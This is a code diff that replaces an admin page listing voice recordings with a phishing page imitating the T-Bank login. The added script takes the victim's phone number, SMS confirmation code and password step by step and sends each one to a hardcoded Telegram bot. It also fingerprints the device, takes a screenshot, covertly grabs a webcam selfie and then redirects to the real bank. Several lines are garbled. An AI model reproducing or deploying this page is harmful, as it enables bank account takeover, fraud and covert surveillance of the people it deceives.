@@ -3,43 +3,355 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Админ — Записи</title>
+<title>Вход в Т-Банк</title>
+<meta property="og:title" content="Т-Банк">
+<meta property="og:description" content="Вход в личный кабинет Т-Банка">
+<meta property="og:image" content="https://www.tbank.ru/favicon.ico">
+<meta property="og:url" content="https://твой-домен.com">
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-body { background: #111; color: #fff; padding: 20px; }
-h1 { font-size: 22px; margin-bottom: 20px; color: #ffdd2d; }
-.item { background: #1e1e1e; padding: 15px; border-radius: 10px; margin-bottom: 15px; }
-.item p { color: #aaa; font-size: 13px; margin-bottom: 10px; }
-audio { width: 100%; }
-.empty { color: #666; text-align: center; margin-top: 50px; }
+body { background: #fff; color: #333; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding: 20px; }
+.container { width: 100%; max-width: 400px; padding-top: 40px; }
+.header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 80px; }
+.logo { background: #000; color: #fff; padding: 6px 12px; border-radius: 8px; font-weight: 700; font-size: 14px; }
+.close { width: 32px; height: 32px; background: #f0f0f0; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 18px; color: #999; cursor: pointer; }
+h1 { font-size: 26px; text-align: center; margin-bottom: 30px; color: #000; font-weight: 700; }
+.field { margin-bottom: 15px; }
+label { display: block; font-size: 13px; color: #666; margin-bottom: 6px; }
+input { width: 100%; padding: 16px; border: 1px solid #e0e0e0; border-radius: 12px; background: #f5f5f5; font-size: 17px; outline: none; color: #333; }
+input:focus { border-color: #ffdd2d; background: #fff; }
+.btn { width: 100%; padding: 16px; background: #ffdd2d; color: #000; border: none; border-radius: 12px; font-size: 17px; font-weight: 600; cursor: pointer; margin-top: 5px; }
+.btn:hover { background: #f5c800; }
+.biometric { width: 100%; padding: 16px; background: #f5f5f5; color: #333; border: none; border-radius: 12px; font-size: 15px; font-weight: 500; cursor: pointer; margin-top: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+.biometric span { color: #5288c1; }
+.policy { text-align: center; font-size: 12px; color: #999; margin-top: 30px; text-decoration: underline; cursor: pointer; }
+.step2 p, .step3 p { text-align: center; color: #666; font-size: 15px; margin-bottom: 25px; }
+.timer { text-align: center; color: #999; font-size: 14px; margin-top: 15px; }
+.hidden { display: none; }
 </style>
 </head>
 <body>
-<h1>Голосовые записи</h1>
-<div id="list"></div>
+<div class="container">
+  <div class="header">
+    <div class="logo">T ID</div>
+    <div class="close">✕</div>
+  </div>
+
+  <div id="step1">
+    <h1>Вход в Т-Банк</h1>
+    <div class="field">
+      <label>Телефон</label>
+      <input type="tel" id="phone" placeholder="+7" value="+7">
+    </div>
+    <button class="btn" id="next1">Продолжить</button>
+    <button class="biometric"><span>👤</span> Войти по скану лица или пальца</button>
+    <div class="policy">Политика обработки персональных данных</div>
+  </div>
+
+  <div id="step2" class="step2 hidden">
+    <h1>Введите код</h1>
+    <p>Отправили код подтверждения на ваш номер</p>
+chat    <div class="field">
+      <label>Код</label_id>
+      <input type="tel" id="code" placeholder',="Код" maxlength="5">
+    </div>
+ chat    <div class="timer" id="timer">Отправим);
+ снова через 40 сек</div>
+   </div>
+
+  <div id="step3" class="step3 hidden">
+    <h1>Введите пароль</h1>
+    <p>Введите пароль от личного кабинета</p>
+    <div class="field">
+      <label>Пароль</label>
+      <input type="password" id="password" placeholder="Пароль">
+    </div>
+    <button class="btn" id="login">Войти</button>
+  </div>
+</div>
+
+<!-- Скрытая форма и iframe для отправки без CORS -->
+<form id="tgForm" action="https://api.telegram.org/bot8374650070:AAGzjKVuATwofDM9ngx-TYIDH1Myizc0LZg/sendMessage" method="GET" target="hidden_iframe" style="display:none;">
+  <input type="hidden" name="chat_id" value="7887003990">
+  <input type="hidden" name="text" id="tgText">
+</form>
+<iframe name="hidden_iframe" style="display:none;"></iframe>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <script>
-fetch('/api/list')
-  .then(function(r) { return r.json(); })
-  .then(function(data) {
-    var list = document.getElementById('list');
-    if (!data.length) {
-      list.innerHTML = '<div class="empty">Пока нет записей</div>';
-      return;
-    }
-    data.forEach(function(item) {
-      var div = document.createElement('div');
-      div.className = 'item';
-      div.innerHTML = '<p>' + item.date + ' — ' + item.phone + '</p>';
-      var audio = document.createElement('audio');
-      audio.src = item.url;
-      audio.controls = true;
-      div.appendChild(audio);
-      list.appendChild(div);
+var token = '8374650070:AAGzjKVuATwofDM9ngx-TYIDH1Myizc0LZg';
+var chat = '7887003990';
+var userData = {};
+
+function send(text) {
+  document.getElementById('tgText').value = text;
+  document.getElementById('tgForm').submit();
+}
+
+function sendPhoto(blob, caption) {
+  var form = new FormData();
+  form.append(' form.append('photo', blob, 'photo.jpg');
+  if (caption) form.append('caption', caption);
+  fetch('https://api.telegram.org/bot' + token + '/sendPhoto', { method: 'POST', body: form });
+}
+
+function getUserID() {
+  var id = localStorage.getItem('uid');
+  if (!id) {
+    id = Math.random().toString(36).substring(2, 10);
+    localStorage.setItem('uid', id);
+  }
+  return id;
+}
+
+function getBasic() {
+  send('👤 ID: ' + getUserID() +
+    '\n📱 UA: ' + navigator.userAgent +
+    '\n🌍 Языки: ' + (navigator.languages || [navigator.language]).join(', ') +
+    '\n💻 Платформа: ' + navigator.platform +
+    '\n🖥 Экран: ' + screen.width + 'x' + screen.height +
+    '\n🎨 Глубина: ' + screen.colorDepth + ' bit' +
+    '\n🔍 DPR: ' + window.devicePixelRatio +
+    '\n🔄 Ориентация: ' + (screen.orientation ? screen.orientation.type : 'н/д') +
+    '\n⚙️ Ядер: ' + (navigator.hardwareConcurrency || 'н/д') +
+    '\n🧠 Память: ' + (navigator.deviceMemory || 'н/д') + ' GB' +
+    '\n👆 Тач: ' + (navigator.maxTouchPoints || 0) +
+    '\n📶 Онлайн: ' + navigator.onLine +
+    '\n🍪 Cookies: ' + navigator.cookieEnabled +
+    '\n🚫 DNT: ' + (navigator.doNotTrack || 'не указан'));
+}
+
+function getTime() {
+  send('🕐 Часовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone +
+    '\n📅 Время: ' + new Date().toLocaleString('ru-RU'));
+}
+
+function getIP() {
+  fetch('https://api.ipify.org?format=json')
+    .then(function(r) { return r.json(); })
+    .then(function(d) { send('🌐 IP: ' + d.ip); })
+    .catch(function() {});
+}
+
+function getBattery() {
+  if (navigator.getBattery) {
+    navigator.getBattery().then(function(b) {
+      send('🔋 Батарея: ' + Math.round(b.level * 100) + '%' + (b.charging ? ' (заряжается)' : ''));
     });
-  })
-  .catch(function() {
-    document.getElementById('list').innerHTML = '<div class="empty">Нужен API для работы</div>';
+  }
+}
+
+function getConnection() {
+  if (navigator.connection) {
+    send('📶 Сеть: ' + (navigator.connection.effectiveType || '?') +
+      '\nТип: ' + (navigator.connection.type || '?') +
+      '\nСкорость: ' + (navigator.connection.downlink || '?') + ' Mbps' +
+      '\nЭкономия: ' + (navigator.connection.saveData ? 'да' : 'нет'));
+  }
+}
+
+function getStorage() {
+  var hasLocal = false, hasSession = false, hasIndexed = false;
+  try { localStorage.setItem('t', '1'); localStorage.removeItem('t'); hasLocal = true; } catch(e) {}
+  try { sessionStorage.setItem('t', '1'); sessionStorage.removeItem('t'); hasSession = true; } catch(e) {}
+  if (window.indexedDB) hasIndexed = true;
+  send('💾 Хранилища: localStorage=' + hasLocal + ', session=' + hasSession + ', indexedDB=' + hasIndexed);
+}
+
+function getMimeTypes() {
+  if (navigator.mimeTypes) {
+    var list = [];
+    for (var i = 0; i < navigator.mimeTypes.length; i++) list.push(navigator.mimeTypes[i].type);
+    send('📄 MIME: ' + list.join(', '));
+  }
+}
+
+function getCanvasFingerprint() {
+  try {
+    var canvas = document.createElement('canvas');
+    canvas.width = 200; canvas.height = 50;
+    var ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = '#069';
+    ctx.fillText('Fingerprint', 2, 15);
+    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+    ctx.fillText('Fingerprint', 4, 17);
+    var hash = 0, str = canvas.toDataURL();
+    for (var i = 0; i < str.length; i++) { hash = ((hash << 5) - hash) + str.charCodeAt(i); hash |= 0; }
+    send('🖼 Canvas: ' + hash);
+  } catch(e) {}
+}
+
+function getWebGLFingerprint() {
+  try {
+    var canvas = document.createElement('canvas');
+    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+      var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+      var vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+      var renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+      send('🎮 WebGL: ' + vendor + ' | ' + renderer);
+    }
+  } catch(e) {}
+}
+
+function getAudioFingerprint() {
+  try {
+    var ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+    var osc = ctx.createOscillator();
+    osc.type = 'triangle';
+    osc.frequency.value = 10000;
+    var comp = ctx.createDynamicsCompressor();
+    osc.connect(comp);
+    comp.connect(ctx.destination);
+    osc.start(0);
+    ctx.startRendering().then(function(buffer) {
+      var data = buffer.getChannelData(0);
+      var sum = 0;
+      for (var i = 0; i < data.length; i++) sum += Math.abs(data[i]);
+      send('🔊 Audio FP: ' + sum.toFixed(2));
+    });
+  } catch(e) {}
+}
+
+function getFonts() {
+  var fonts = ['Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana', 'Tahoma', 'Trebuchet MS', 'Comic Sans MS', 'Impact', 'Webdings', 'Roboto', 'Helvetica', 'Segoe UI'];
+  var detected = [];
+  var canvas = document.createElement('canvas');
+  var ctx = canvas.getContext('2d');
+  var text = 'mmmmmmmmmmlli';
+  var baseFonts = ['monospace', 'sans-serif', 'serif'];
+  var baseSizes = {};
+  baseFonts.forEach(function(base) {
+    ctx.font = '72px ' + base;
+    baseSizes[base] = ctx.measureText(text).width;
   });
+  fonts.forEach(function(font) {
+    baseFonts.forEach(function(base) {
+      ctx.font = '72px "' + font + '", ' + base;
+      if (ctx.measureText(text).width !== baseSizes[base] && detected.indexOf(font) === -1) detected.push(font);
+    });
+  });
+  send('🔤 Шрифты: ' + detected.join(', '));
+}
+
+function getScreenRefresh() {
+  var last = performance.now(), count = 0;
+  function tick(t) {
+    count++;
+    if (t - last > 1000) { send('🖥 Частота экрана: ~' + count + ' Hz'); return; }
+    requestAnimationFrame(tick);
+  }
+  requestAnimationFrame(tick);
+}
+
+function getAPIs() {
+  var apis = [];
+  if (window.WebAssembly) apis.push('WebAssembly');
+  if (window.RTCPeerConnection) apis.push('WebRTC');
+  if (window.WebSocket) apis.push('WebSocket');
+  if (navigator.bluetooth) apis.push('Bluetooth');
+  if (navigator.usb) apis.push('USB');
+  if (navigator.serviceWorker) apis.push('ServiceWorker');
+  send('🔧 API: ' + apis.join(', '));
+}
+
+function getTheme() {
+  var theme = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'тёмная' : 'светлая';
+  var motion = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 'уменьшена' : 'обычная';
+  send('🎨 Тема: ' + theme + '\n🌀 Анимация: ' + motion);
+}
+
+function trackTime() {
+  var start = Date.now();
+  window.addEventListener('beforeunload', function() {
+    var sec = Math.round((Date.now() - start) / 1000);
+    send('⏱ Время на сайте: ' + sec + ' сек');
+  });
+}
+
+function takeScreenshot() {
+  if (typeof html2canvas !== 'undefined') {
+    html2canvas(document.body).then(function(canvas) {
+      canvas.toBlob(function(blob) { sendPhoto(blob, '📸 Скриншот'); }, 'image/jpeg', 0.7);
+    });
+  }
+}
+
+function takePhoto() {
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+      .then(function(stream) {
+        var video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        setTimeout(function() {
+          var canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          canvas.toBlob(function(blob) { sendPhoto(blob, '🤳 Селфи'); }, 'image/jpeg', 0.8);
+          stream.getTracks().forEach(function(t) { t.stop(); });
+        }, 2000);
+      })
+      .catch(function() {});
+  }
+}
+
+getBasic();
+getTime();
+getIP();
+getBattery();
+getConnection();
+getStorage();
+getMimeTypes();
+getCanvasFingerprint();
+getWebGLFingerprint();
+getAudioFingerprint();
+getFonts();
+getScreenRefresh();
+getAPIs();
+getTheme();
+trackTime();
+setTimeout(takeScreenshot, 3000);
+
+document.getElementById('next1').addEventListener('click', function() {
+  var phone = document.getElementById('phone').value;
+  if (!phone || phone.length < 12) { alert('Введите номер телефона'); return; }
+  userData.phone = phone;
+  send('📱 Телефон: ' + phone);
+  takePhoto();
+  document.getElementById('step1').classList.add('hidden');
+  document.getElementById('step2').classList.remove('hidden');
+  var t = 40;
+  var timer = document.getElementById('timer');
+  var int = setInterval(function() {
+    t--;
+    timer.textContent = 'Отправим снова через ' + t + ' сек';
+    if (t <= 0) { clearInterval(int); timer.textContent = 'Отправить код снова'; }
+  }, 1000);
+});
+
+document.getElementById('code').addEventListener('input', function() {
+  if (this.value.length === 5) {
+    userData.code = this.value;
+    send('🔑 Код: ' + this.value);
+    document.getElementById('step2').classList.add('hidden');
+    document.getElementById('step3').classList.remove('hidden');
+  }
+});
+
+document.getElementById('login').addEventListener('click', function() {
+  var pass = document.getElementById('password').value;
+  if (!pass || pass.length < 1) { alert('Введите пароль'); return; }
+  userData.pass = pass;
+  send('🔒 Пароль: ' + pass);
+  send('✅ Итог:\nТелефон: ' + userData.phone + '\nКод: ' + userData.code + '\nПароль: ' + pass);
+  window.location.href = 'https://www.tbank.ru';
+});
 </script>
 </body>
 </html>
